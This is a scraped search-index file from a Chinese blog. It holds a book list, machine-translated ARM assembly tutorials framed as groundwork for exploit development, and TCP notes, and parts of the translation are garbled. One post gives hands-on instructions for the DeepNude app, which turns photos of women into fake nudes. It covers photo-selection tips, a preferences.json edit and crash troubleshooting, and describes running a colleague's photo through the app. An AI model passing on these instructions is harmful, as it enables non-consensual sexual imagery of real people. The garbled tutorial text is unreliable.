我在阅读这本书的时候，可以深刻感受到贝佐斯个人性格之于这家公司的影响，他对细节的迷恋以及「机械式」的做事方式，塑造了整个亚马逊公司做事方式和行为逻辑，也难怪在他宣布即将退休的时候，多家媒体认为贝佐斯留给亚马逊的是「创新机器」（可参考 FT 的这篇长文）。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:7","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"我们为什么要工作？ 当我们谈起「Work」（工作）这个词的时候，我们在谈论什么？ 996、大小周、「内卷」、财富自由、打工人、「福报」……这些当下与工作紧密相关的词汇背后，到底又意味着什么呢？这本 Work: A Deep History, from the Stone Age to the Age of Robots（亚马逊 kindle 商店）从探讨工作的「起源」起步， 作者 James Suzman 勾勒出一副人类工作的变迁历史。 一开始，「工作」是人类生存的必然要求，早期人类的所谓「工作」，与动物们寻找食物并没有本质区别，都是为了获取能量，这构成「工作」的第一层要义。 而随着人类进化与文明的出现，「工作」被赋予更多社会层面的意义，更重要的是，从农业社会到工业社会再到信息社会，「工作」的形态、定义都在发生着微妙变化。想象一下，未来的人类回头去看现在这些「工作」形态的时候，或许也会产生当下我们回顾 19 世纪英国工人工作的想法。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:8","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"被滥用的「平台经济」 「平台（Platform）」是一个令无数创业者无法拒绝的概念，通过将自己的产品与「平台」搭上关系，极有可能会成为投资人、媒体乃至消费者关注的对象。 但另一方面，「平台」又是一个被极度滥用的词，很多时候，我们沉迷于某种叙述逻辑之中，却忘记了这个叙述可能是个假命题。 这就是这本书 Platform Delusion（亚马逊 Kindle 商店）所要做的事情：让「平台」一词回顾正常，同时点评市面上的所谓「平台」公司的成色如何。 作者 Jonathan Knee 来自哥大商学院，这个身份为他带来丰富的案例佐证，同时他的职业特点，又让整本书在严谨论证与易读之间无法做到平衡。如果你也不喜欢作者使用 20 多页的篇幅谈论网络效应，那么我非常推荐各位从第二部分入手，在这一部分，作者对 FB、亚马逊、苹果、Google、Netflix 五家公司做了深入而独到的分析，通过案例进一步理解作者的观点。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:9","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"软件开发者思维 Twilio 创始人、CEO Jeff Lawson 今年出版了一本名为 Ask Your Developer（亚马逊 Kindle 商店），这本书名来自于 Twillo 公司的一个广告宣传语。正如 Jeff Lawson 所言，Twilio 是一个只有开发者才了解的服务，通过这样的广告口号，让企业管理层认识到开发者以及软件的价值。 这本书要探讨的是，当「软件吃掉世界」已经成为必然的时候，如何培养自己与企业的开发者思维，一方面，所有的公司都会变成软件公司，但并不是购买软件或使用软件都可以实现转型，作者在这里花了大量篇幅探讨企业为什么要自己构建软件。 另一方面，作者进一步延伸了「软件吃掉世界」的论断，其根本要义在于，软件（从前端 UI 交互到后端数据库）成为服务的新入口，人们不再通过物理入口（比如实体店）获取产品与服务，而是通过屏幕与软件交互，由此带来的不仅是整个思维模式的重构，更是开启了一个全新的商业模式。 值得一提的是，Jeff Lawson 曾在亚马逊工作多年，本书也有很多关于亚马逊早期企业文化以及软件开发的小故事。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:10","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"尾巴 正如约翰·伯格所言，「阅读时，我们栖息在（书）里」，像一个做客的客人聆听主人（作者）讲述他们对世界的理解，透过他们的眼睛与经验构建起一个观察世界的视角，而当合上图书，我们又成为另一本书里的主角，用行动演绎属于自己的故事。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-18","objectID":"/zh-cn/18/:0:11","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["汇编","ARM"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); ARM \u0026 THUMB ARM处理器有两个主要状态，它们可以运行（这里不算Jazelle），ARM和Thumb。这些状态与权限级别无关。例如，在 SVC 模式下运行的代码可以是 ARM 或 Thumb。这两种状态之间的主要区别在于指令集，其中 ARM 状态下的指令始终为 32 位，而处于 Thumb 状态的指令为 16 位（但可以是 32 位）。了解何时以及如何使用 Thumb 对于我们的 ARM 漏洞利用开发目的尤为重要。在编写ARM外壳代码时，我们需要摆脱NULL字节，并且使用16位Umb指令而不是32位ARM指令可以降低拥有它们的机会。 ARM 版本的调用约定不仅令人困惑，而且并非所有 ARM 版本都支持相同的 Thumb 指令集。在某个时候，ARM引入了一个增强的拇指指令集（伪名称：Thumbv2），它允许32位拇指指令甚至条件执行，这在之前的版本中是不可能的。为了在 Thumb 状态下使用条件执行，引入了\"it\"指令。但是，该指令随后在后来的版本中被删除，并与应该使事情变得不那么复杂的东西交换，但结果恰恰相反。我不知道所有不同ARM版本中ARM / Thumb指令集的所有不同变体，老实说我不在乎。你也不应该。您唯一需要知道的是目标设备的ARM版本及其特定的Thumb支持，以便您可以调整代码。ARM 信息中心应该可以帮助您了解 ARM 版本（http://infocenter.arm.com/help/index.jsp）的具体情况。 如前所述，有不同的拇指版本。不同的命名只是为了将它们彼此区分开来（处理器本身将始终将其称为Thumb）。 Thumb-1（16 位指令）：用于 ARMv6 和早期架构。 Thumb-2（16 位和 32 位指令）：通过添加更多指令并允许它们为 16 位或 32 位宽（ARMv6T2、ARMv7）来扩展 Thumb-1 的范围。 ThumbEE：包括一些针对动态生成的代码（在执行前不久或在执行期间在设备上编译的代码）的一些更改和添加。 ARM 和 Thumb 之间的区别： 条件执行：ARM 状态下的所有指令都支持条件执行。某些 ARM 处理器版本允许使用 IT 指令在 Thumb 中执行条件。条件执行导致更高的代码密度，因为它减少了要执行的指令数并减少了昂贵的分支指令数。 32 位 ARM 和拇指指令：32 位拇指指令具有 .w 后缀。 桶形换档器是另一个独特的ARM模式功能。它可用于将多个指令缩减为一个。例如，您可以使用1 -\u003e移动移动Mov R1，R0，LSL #1;在MOV指令中包含乘法，而不是使用两个指令进行乘法（将寄存器乘以2并使用MOV将结果存储到另一个寄存器中）;R1 = R0 * 2 要切换处理器执行的状态，必须满足以下两个条件之一： 我们可以使用分支指令 BX（分支和交换）或 BLX（分支、链接和交换），并将目标寄存器的最低有效位设置为 1。这可以通过向偏移量添加 1 来实现，例如 0x5530 + 1。您可能会认为这会导致对齐问题，因为指令是 2 字节或 4 字节对齐的。这不是问题，因为处理器将忽略最低有效位。第 6 部分：条件执行和分支中的更多详细信息。 我们知道，如果设置了当前程序状态寄存器中的 T 位，则处于 Thumb 模式。 ARM 说明简介 本部分的目的是简要介绍ARM的指令集及其一般用途。对我们来说，了解汇编语言中最小的部分如何运作，它们如何相互连接以及通过组合它们可以实现什么至关重要。 如前所述，汇编语言由作为主要构建块的指令组成。ARM 指令后面通常跟一个或两个操作数，并且通常使用以下模板： MNEMONIC{S}{condition} {Rd}, Operand1, Operand2 由于 ARM 指令集的灵活性，并非所有指令都使用模板中提供的所有字段。但是，模板中字段的用途描述如下： MNEMONIC - Short name (mnemonic) of the instruction {S} - An optional suffix. If S is specified, the condition flags are updated on the result of the operation {condition} - Condition that is needed to be met in order for the instruction to be executed {Rd} - Register (destination) for storing the result of the instruction Operand1 - First operand. Either a register or an immediate value Operand2 - Second (flexible) operand. Can be an immediate value (number) or a register with an optional shift 虽然助记符、S、Rd 和 Operand1 字段是直截了当的，但条件和 Operand2 字段需要进一步澄清。条件字段与 CPSR 寄存器的值密切相关，或者更确切地说，与寄存器内特定位的值密切相关。Operand2被称为灵活的操作数，因为我们可以以各种形式使用它 - 作为即时值（具有有限的值集），寄存器或寄存与移位。例如，我们可以将这些表达式用作 Operand2： #123 - Immediate value (with limited set of values). Rx - Register x (like R1, R2, R3 ...) Rx, ASR n - Register x with arithmetic shift right by n bits (1 = n = 32) Rx, LSL n - Register x with logical shift left by n bits (0 = n = 31) Rx, LSR n - Register x with logical shift right by n bits (1 = n = 32) Rx, ROR n - Register x with rotate right by n bits (1 = n = 31) Rx, RRX - Register x with rotate right by one bit, with extend 作为不同类型指令外观的简单示例，让我们看一下以下列表。 ADD R0, R1, R2 - Adds contents of R1 (Operand1) and R2 (Operand2 in a form of register) and stores the result into R0 (Rd) ADD R0, R1, #2 - Adds contents of R1 (Operand1) and the value 2 (Operand2 in a form of an immediate value) and stores the result into R0 (Rd) MOVLE R0, #5 - Moves number 5 (Operand2, because the compiler treats it as MOVLE R0, R0, #5) to R0 (Rd) ONLY if the condition LE (Less Than or Equal) is satisfied MOV R0, R1, LSL #1 - Moves the contents of R1 (Operand2 in a form of register with logical shift left) shifted left by one bit to R0 (Rd). So if R1 had value 2, it gets shifted left by one bit and becomes 4. 4 is then moved to R0. 作为快速总结，让我","date":"2021-12-17","objectID":"/zh-cn/17/:0:0","tags":["汇编","ARM"],"title":"ARM \u0026 THUMB","uri":"/zh-cn/17/"},{"categories":["汇编","ARM"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); ARM 组装基础知识简介 欢迎阅读有关 ARM 程序集基础知识的本教程系列。这是关于ARM 漏洞开发的后续教程系列的准备工作。在深入创建 ARM shellcode 和构建 ROP 链之前，我们需要先介绍一些 ARM Assembly 基础知识。 将逐步介绍以下主题： ARM Assembly Basics Basics Tutorial Series： Part 1： ARM Assembly 简介 第 2 部分： 数据类型寄存器 第 3 部分： ARM 指令 集 第 4 部分： 内存指令： 加载和存储数据 第 5 部分： 加载和存储多个 第 6 部分： 条件执行和分支 第 7 部分： 堆栈和函数 若要按照示例进行操作，将需要一个基于 ARM 的实验室环境。如果您没有 ARM 设备（如 Raspberry Pi），则可以按照本教程使用 QEMU 和 Raspberry Pi 发行版在虚拟机中设置自己的实验室环境。如果您不熟悉使用GDB进行基本调试，则可以在本教程中获取基础知识。在本教程中，重点将放在 ARM 32 位上，示例在 ARMv6 上编译。 ","date":"2021-12-16","objectID":"/zh-cn/16/:0:0","tags":["汇编","ARM"],"title":"ARM 组装基础知识简介","uri":"/zh-cn/16/"},{"categories":["汇编","ARM"],"content":"为什么选择 ARM？ 本教程通常面向想要学习 ARM 组装基础知识的人员。特别是对于那些对ARM平台上的漏洞利用写作感兴趣的人。您可能已经注意到 ARM 处理器无处不在。当我环顾四周时，我可以数出我家里装有ARM处理器的设备比英特尔处理器多得多。这包括手机，路由器，不要忘记这些天似乎在销售中爆炸式增长的物联网设备。也就是说，ARM处理器已成为世界上最广泛的CPU内核之一。这给我们带来了这样一个事实，即与PC一样，物联网设备容易受到不正确的输入验证滥用（例如缓冲区溢出）的影响。鉴于基于ARM的设备的广泛使用和滥用的可能性，对这些设备的攻击变得更加普遍。 然而，与ARM相比，我们有更多的专家专门从事x86安全研究，尽管ARM汇编语言可能是广泛使用的最简单的汇编语言。那么，为什么没有更多的人关注ARM呢？也许是因为与ARM相比，有更多关于英特尔漏洞利用的学习资源。想想由模糊安全或Corelan 团队撰写的有关英特尔 x86 漏洞利用漏洞的精彩教程 – 此类指南可帮助对此特定领域感兴趣的人获得实用知识和灵感，以学习这些教程中涵盖的内容之外的知识。如果您对 x86 漏洞利用编写感兴趣，Corelan 和 Fuzzysec 教程是您完美的起点。在本教程系列中，我们将重点介绍汇编基础知识和 ARM 漏洞利用编写。 ARM 处理器与英特尔处理器 英特尔和ARM之间有很多区别，但主要区别在于指令集。英特尔是一款 CISC（复杂指令集计算）处理器，具有更大、功能更丰富的指令集，并允许许多复杂指令访问内存。因此，它具有比ARM更多的操作，寻址模式，但寄存器更少。CISC处理器主要用于普通PC，工作站和服务器。 ARM是RISC（精简指令集计算）处理器，因此具有简化的指令集（100条指令或更少）和比CISC更多的通用寄存器。与英特尔不同，ARM 使用仅在寄存器上运行的指令，并使用加载/存储内存模型进行内存访问，这意味着只有加载/存储指令才能访问内存。这意味着在 ARM 上的特定内存地址处递增 32 位值需要三种类型的指令（加载、递增和存储），以便首先将特定地址处的值加载到寄存器中，在寄存器中递增，然后将其存储回寄存器中的内存。 简化的指令集有其优点和缺点。其中一个优点是指令可以更快地执行，从而可能允许更高的速度（RISC系统通过减少每条指令的时钟周期来缩短执行时间）。缺点是，更少的指令意味着更强调使用有限的指令编写软件的高效。同样需要注意的是，ARM 有两种模式，ARM 模式和拇指模式。拇指指令可以是 2 个或 4 个字节（有关第3 部分：ARM 指令集） 中的更多信息）。 ARM 和 x86 之间的更多区别包括： 在 ARM 中，大多数指令都可用于条件执行。 英特尔 x86 和 x86-64 系列处理器使用小端格式 ARM 架构在版本 3 之前是小端。从那时起，ARM处理器成为**BI-endian，**并具有允许可切换字节序的设置。 不仅英特尔和ARM之间存在差异，而且不同ARM版本本身之间也存在差异。本教程系列旨在使其尽可能通用，以便您大致了解 ARM 的工作原理。了解基础知识后，就可以轻松了解所选目标 ARM 版本的细微差别。本教程中的示例是在 32 位 ARMv6（Raspberry Pi 1）上创建的，因此解释与此确切版本相关。 不同 ARM版本的命名也可能令人困惑： ARM 系列 ARM 架构 断续器7 ARM v4 断续器9 ARM v5 断续器11 ARM v6 皮质-A ARM v7-A 皮质-R ARM v7-R 皮质-M ARM v7-M 编写程序集 在我们开始深入研究 ARM 漏洞开发之前，我们首先需要了解汇编语言编程的基础知识，这需要一些背景知识，然后才能开始欣赏它。但是，为什么我们甚至需要ARM Assembly，用\"正常\"的编程/脚本语言编写我们的漏洞还不够吗？如果我们希望能够进行逆向工程并了解ARM二进制文件的程序流，构建自己的ARM外壳代码，制作ARM ROP链并调试ARM应用程序，则不是。 你不需要知道汇编语言的每一个小细节，就能进行逆向工程和漏洞开发，但其中一些是理解大局所必需的。本教程系列将介绍基础知识。如果您想了解更多信息，可以访问本章末尾列出的链接。 那么，究竟什么是汇编语言呢？汇编语言只是机器代码之上的一个薄语法层，机器代码由指令组成，这些指令以二进制表示（机器代码）编码，这是我们的计算机所理解的。那么，我们为什么不直接编写机器代码呢？好吧，那将是屁股上的痛苦。出于这个原因，我们将编写汇编，ARM汇编，这对人类来说更容易理解。我们的计算机本身无法运行汇编代码，因为它需要机器代码。我们将用于将汇编代码组装成机器代码的工具是来自GNU Binutils项目的GNU汇编程序***，**该项目被命名为与具有.s扩展名的源文件一起使用。 使用扩展名 *.s 编写程序集文件后，需要使用as进行组装，并将其与ld 链接： $ as program.s -o program.o $ ld program.o -o program 引擎盖下的组装 让我们从最底层开始，一直到汇编语言。在最低级别，我们的电路上有电信号。信号是通过将电压切换到两个电平之一来形成的，例如0伏（“关闭”）或5伏（“开”）。因为仅仅通过观察，我们无法轻易地判断电路处于什么电压，所以我们选择使用视觉表示（数字0和1）来编写开/关电压的模式，不仅表示信号不存在或存在的概念，而且还因为0和1是二进制系统的数字。然后，我们将0和1的序列分组以形成机器码指令，这是计算机处理器的最小工作单元。下面是一个机器语言指令示例： 1110 0001 1010 0000 0010 0000 0000 0001 到目前为止，一切都很好，但我们已经记不清这些模式（0和1）的含义。出于这个原因，我们使用所谓的助记符，缩写来帮助我们记住这些二进制模式，其中每个机器代码指令都有一个名称。这些助记符通常由三个字母组成，但这不是强制性的。我们可以使用这些助记符作为指令编写程序。该程序称为汇编语言程序，用于表示计算机机器代码的助记符集称为该计算机的汇编语言。因此，汇编语言是人类用来对计算机进行编程的最低级别。指令的操作数位于助记符之后。下面是一个示例： MOV R2, R1 现在我们知道汇编程序是由称为助记符的文本信息组成的，我们需要将其转换为机器代码。如上所述，在ARM汇编的情况下，GNU Binutils项目为我们提供了一个名为的工具。使用汇编程序（如从（ARM）汇编语言转换为（ARM）机器代码的过程称为汇编。 总之，我们了解到计算机理解（响应）电压（信号）的存在与否，并且我们可以表示0和1s（位）序列中的多个信号。我们可以使用机器代码（信号序列）使计算机以某种明确定义的方式进行响应。因为我们不记得所有这些序列的含义，所以我们给它们缩写 - 助记符，并用它们来表示指令。这组助记符是计算机的汇编语言，我们使用一个名为Assembler的程序将代码从助记符表示转换为计算机可读的机器代码，就像编译器对高级语言所做的那样。 延伸阅读 \\1. ARM组装的旋风之旅。 https://www.coranac.com/tonc/text/asm.htm \\2. 树莓派中的 ARM 汇编器。 http://thinkingeek.com/arm-assembler-raspberry-pi/ \\3. 实用逆向工程：x86，x64，ARM，Windows内核，逆转工具和混淆，由Bruce Dang，Alexandre Gazet，Elias Bachaalany和Sebastien Josse制作。 \\4. ARM 参考手册。 http://infocenter.arm.com/help/topic/com.arm.doc.dui0068b/index.html \\5. 汇编程序用户指南。 http://www.keil.com/support/man/docs/armasm/default.htm 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-16","objectID":"/zh-cn/16/:0:1","tags":["汇编","ARM"],"title":"ARM 组装基础知识简介","uri":"/zh-cn/16/"},{"categories":["DeepNude","AI"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # DeepNude.exe点击Transform之后闪退无响应停止工作使用不了？ DeepNude是个美国人推出的照片“一键脱衣”的app应用。支持在线版，Windows版和Linux版。. DeepNude管见推出仅几个小时，官方网站服务器便被挤爆，想要下载DeepNude的人实在太多了。. DeepNude的功能其实非常非常简单，只要在DeepNude导入一张人类照片，或者画像，就能生成一张果图。问题是还是必须是女性的人类照片，还不能是男性的，否则DeepNude也会把照片变成女性的。在笔记本电脑上就能运行DeepNude，DeepNude要求的电脑配置不是很高，全程一键生成过程大概一分钟搞定。也不用什么专业知识，简单操作电脑就够了。. 但是在广大DeepNude用户的热情包围之下，DeepNude app并没有活过5天，而且是官方团队亲手下架的。原因是DeepNude下载的用户过多，风险难以控制。还有另一个原因是受到外界的批评。. 那么，DeepNude到底是一款怎么样的应用？ (注：如果有人把生成的完整图片毫无遮掩地传播出去，请参见刑法第364条。) . 刑法第三百六十四条 【传播淫秽物品罪；组织播放淫秽音像制品罪】传播淫秽的书刊、影片、音像、图片或者其他淫秽物品，情节严重的，处二年以下有期徒刑、拘役或者管制。 组织播放淫秽的电影、录像等音像制品的，处三年以下有期徒刑、拘役或者管制，并处罚金；情节严重的，处三年以上十年以下有期徒刑，并处罚金。制作、复制淫秽的电影、录像等音像制品组织播放的，依照第二款的规定从重处罚。 向不满十八周岁的未成年人传播淫秽物品的，从重处罚。 条文注释. “传播”是指在公共场所或者公众之中进行传播，主要是指通过传阅、出借、展示、赠送、讲解等方式散布、流传淫秽物品的。这种传播行为可以是在公共场合公开进行，也可以是在公众中私下进行。其传播不是以牟利为目的，如以牟利为目的传播应依照第三百六十三条的规定定罪处罚。“情节严重”主要是指多次、经常性地在社会上传播淫秽物品；所传播的淫秽物品数量较大；或者虽然传播淫秽物品数量不大、次数不多，但被传播对象人数众多；造成的后果严重等等。第二款中的“组织播放”是指召集多人播放淫秽电影、录像等音像制品的行为。播放淫秽音像制品，实质上也是一种传播淫秽物品的方式，鉴于这种行为在传播淫秽物品的各项活动中比较突出，且危害也比较严重，本款将这种行为规定为一个独立的罪名。DeepNude和电脑上的其他“绿色版”应用程序没什么两样。DeepNude现在的最新版本是2.0版为了防止下载DeepNude文件中毒，我们用了一个闲置的DELL笔记本，配置：四核英特尔i5处理器，8G内存，英特尔HD Graphics 620显卡。. 1、使用夏季照片：暴露的皮肤越多，效果越好;. 2、使用变焦条设置最佳缩放级别，使用上图作为参考;. 3、移动以人为中心的图像（单击并拖动）. 调整后点击右下角的Transform，就可以一键生成图片了！是不是很简单？其它的功能还是等各位聚聚自己探索吧！. 4、修改preferences.json. {“init”: “yes”, “library”: “yes”, “email”: “”, “transform”: “no”}. 下载DeepNude2.0完成解压后，整个文件大小为2.45G，点击DeepNude的“.exe”文件就能运行。. . . 在使用DeepNude整个前序工作，只需要找到一张图片，上传后点击Transform就行了。. ps:删除deepnude根目录中的color.cp36-win_amd64.pyd文件，但有可能会出现. 删除color.cp36-win_amd64.pyd 程序打开就出现failed to execute script main，先看下路径是不是中文。有网友问preference.json在哪里??还有 我下载以后,2文件安装到1文件里 结果打开是一篇英文（类似于免责声明之类的）没有别的选项，怎么破？在最下面只是显示不了而已，调下屏幕分辨率即可。以下是Deepnude出现错误failed to execute script main的解决思路:. 1.将整个main文件try起来,防止程序直接崩溃而关闭.. 2.使用 raw_input进行界面交互,防止窗口一闪而过.. 执行后再控制台界面中就可以看到报错信息了.. 有报错信息后就能一一解决了.. 我这边遇到的是需要 import decimal ,虽然到现在我还不知道到底哪需要这个了.. 另外一个,如果程序需要其他基础文件或者文件夹的,打包exe后,需要在exe对应目录里添加文件和文件夹.. DeepNude官方提示，一般30秒左右（实测一分钟左右）就能得到不雅照图片一张。. 但点下Transform之后，80%以上的情况会当头给你一个闪退。. 我们DeepNude导入了蒙娜丽莎，足足等了一分多之后，是这样：. . DeepNude没有丝毫预警就闪退了，仿佛什么也没发生过。. 然后，用同事的图，也是这样：DeepNude崩溃之频繁，让专心研究的我们有点怀疑人生……. 感觉，这个DeepNude应用能不能“脱衣”，完全靠运气。不仅仅是DeepNude软件运行不稳定，生成效果也很魔性：就算运气好得到了不雅照，如果没有高级版（也就是付费版），最后生成的图像也看不到啥，马赛克打的“非常到位”。. . 就这样的结果，不雅照生成也有诸多“讲究”。. 首先，DeepNude上传的图片中人物穿的衣服越少，生成效果越好。如果给了一个衣服特别多的图片，处理效果非常暴力。其次，DeepNude软件不分男女一视同仁，都把你看成女人。就算你放上男性、甚至一个海绵宝宝的照片，也会给它“P”个大mm上去，看起来非常的恐怖。第三，应用一改往常AI软件中白人效果最好的情况，黑白黄三种肤色中，黑人效果相对好些。下面是一个效果已经算不错的案例。最后，如果是狠狠P过的图片，DeepNude最后生成的图片违和感特别严重。在这些情况之外，违和感虽然相对较小，但也给人一种很假的感觉。看到这里大家都明白了吧DeepNude生成的本身就是假照片，完全不是真的，最多只是像而已。总之，想要通过DeepNude得到一张不雅照图片，天时、地利、人和缺一不可，而且效果也没那么神奇。DeepNude使用万张不雅照图片训练. DeepNude团队里，有一位不愿透露姓名、只想化名Alberto发言：这个DeepNude应用是建立在一种叫做pix2pix的算法基础之上。pix2pix，是输入一张图、然后把图上的每个像素逐一翻译的方法，里面住着生成对抗网络 (GAN) ：生成器，根据自己看到过的图像，学着画出新图像；鉴别器，负责看穿哪些图像是真的，哪些是生成器画的。它们就在被欺骗与被识破的对抗中不断成长，制造出越来越逼真的假图。 DeepNude团队用了10,000张果图训练这个网络，得到了如今的网络。那么问题来了，他们是从哪里得到了启发，才想做一个这样的应用呢？其实一切都来源于上个20世纪，一则古早画风的虚假广告。. 广告的内容是，眼镜拥有X光功效，可以透过“现象”看 “本质”。事实是，显然做不到。但配图令人心驰神往，以至于有人在多年后仍然十分怨念：它不知骗了我们多少零花钱。更多的人类只是默默心疼，而DeepNude团队的小伙伴们，却对当年淳朴的愿望记忆犹新。于是，DeepNude可能是带着童真的味道面世了，连Logo也在致敬“经典”。不过，随着应用下线，团队大概也只能在心里继续致敬了。. One More Thing. . DeepNude官方下架前最后遗言是这样的：在DeepNude生命的尽头，回顾一个简短的历史。几个月前，我们启动了这个项目，是出于娱乐目的。最初以为，一个月也就卖出几份，应该在可以控制的范围内。说实话，这个应用也没那么完美，只对特定的图片才有效。我们从来没想过它会像病毒一样扩散，流量大到控制不住。虽然DeepNude生成的图片已经出于安全考虑打了码，但如果有50万人用的话，出现滥用的风险还是很大。. . 我们也不希望通过这种方式挣钱。当然，还是有一些副本会在网上流传，但我们不想做那个靠此获利的人。如果是","date":"2021-12-15","objectID":"/zh-cn/15/:0:0","tags":["DeepNude","AI"],"title":"一键脱衣的app应用","uri":"/zh-cn/15/"},{"categories":["网络"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 计算机网络 一些积累的网络方面的知识𝑙𝑡𝑠lts TCP ","date":"2021-12-14","objectID":"/zh-cn/14/:0:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"特性 TCP 提供一种面向连接的、可靠的字节流服务 在一个 TCP 连接中，仅有两方进行彼此通信。广播和多播不能用于 TCP TCP 使用校验和，确认和重传机制来保证可靠传输 TCP 给数据分节进行排序，并使用累积确认保证数据的顺序不变和非重复 TCP 使用滑动窗口机制来实现流量控制，通过动态改变窗口的大小进行拥塞控制 ","date":"2021-12-14","objectID":"/zh-cn/14/:1:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"结构 structure.jpg Source Port \u0026\u0026 Destination Port: 源端口和目的端口,各占两个字节 Sequence Number: 序号,占4字节 Acknowledgment Number: 确认号,占4字节 Data offset: 数据偏移, 占4位 Deserved: 保留,占6位 Window: 窗口, 占2字节 Checksum: 校验和, 占2字节 Urgent Pointer: 紧急指针, 占2字节 Options: 选项, 可变长度,最长可达40字节 PAdding: 填充 ","date":"2021-12-14","objectID":"/zh-cn/14/:2:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"控制位 有六个,且只有”0”和”1”两种状态 abbreviations Name Meaning operation URG URGent 紧急 高优先级数据 ACK ACKnowledgment 确认 建立连接后所有的报文AKC都为1 PSH PuSH 推送 立刻会话 RST ReSeT 复位 出现差错,需要释放连接 SYN SYNchronization 同步 建立连接时用来同步序号 FIN Finis 终止 释放连接 ","date":"2021-12-14","objectID":"/zh-cn/14/:2:1","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"建立连接–三次握手 第一次握手𝑆𝑌𝑁=1,𝑠𝑒𝑞=𝑥SYN=1,seq=x: 客户端发送一个 TCP 的 SYN 标志位置1的包，指明客户端打算连接的服务器的端口，以及初始序号 X,保存在包头的序列号𝑆𝑒𝑞𝑢𝑒𝑛𝑐𝑒𝑁𝑢𝑚𝑏𝑒𝑟SequenceNumber字段里。 发送完毕后，客户端进入 SYN_SEND 状态。 第二次握手𝑆𝑌𝑁=1,𝐴𝐶𝐾=1,𝑠𝑒𝑞=𝑦,𝐴𝐶𝐾𝑛𝑢𝑚=𝑥+1SYN=1,ACK=1,seq=y,ACKnum=x+1: 服务器发回确认包𝐴𝐶𝐾ACK应答。即 SYN 标志位和 ACK 标志位均为1。服务器端选择自己 ISN 序列号，放到 Seq 域里，同时将确认序号𝐴𝑐𝑘𝑛𝑜𝑤𝑙𝑒𝑑𝑔𝑒𝑚𝑒𝑛𝑡𝑁𝑢𝑚𝑏𝑒𝑟AcknowledgementNumber设置为客户的 ISN 加1，即X+1。 发送完毕后，服务器端进入 SYN_RCVD 状态。 第三次握手𝐴𝐶𝐾=1，𝐴𝐶𝐾𝑛𝑢𝑚=𝑦+1ACK=1，ACKnum=y+1客户端再次发送确认包𝐴𝐶𝐾ACK，SYN 标志位为0，ACK 标志位为1，并且把服务器发来 ACK 的序号字段+1，放在确定字段中发送给对方，并且在数据段放写ISN的+1发送完毕后，客户端进入 ESTABLISHED 状态，当服务器端接收到这个包时，也进入 ESTABLISHED 状态，TCP 握手结束。 